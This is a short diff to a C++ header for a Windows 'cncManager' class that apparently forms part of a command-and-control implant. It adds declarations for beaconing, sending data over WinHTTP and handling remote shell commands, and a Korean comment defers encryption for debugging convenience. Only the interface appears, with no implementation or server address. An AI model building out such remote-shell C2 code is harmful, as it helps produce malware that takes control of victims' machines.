@@ -1,7 +1,10 @@
 #pragma once
+#include "commandManager.h"
 #include <Windows.h>
 #include "DDproto.h"
 #include <winhttp.h>
+#include <string>
+#include <list>
 
 class cncManager
 {
@@ -17,6 +20,7 @@ private:
 		hRequest = NULL;
 
 	BOOL bResults = FALSE;
+	std::list<std::string> shellCmd;
 
 public:
 	cncManager();
@@ -25,7 +29,8 @@ public:
 	void responseParser(UCHAR* res, DWORD len);
 	void sendHttpRequest(LPVOID data, DWORD dlen);
 	void sendBeacon();
-	void sendData(UCHAR DDtype, DWORD len, LPVOID stream);
+	void sendData(UCHAR DDtype, ULONG64 len, LPVOID stream);
+	void handleShellRequest(commandManager& commander);
 	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
 	LPVOID dataEncrypt(LPVOID data);
 	LPVOID dataDecrypt(LPVOID data);
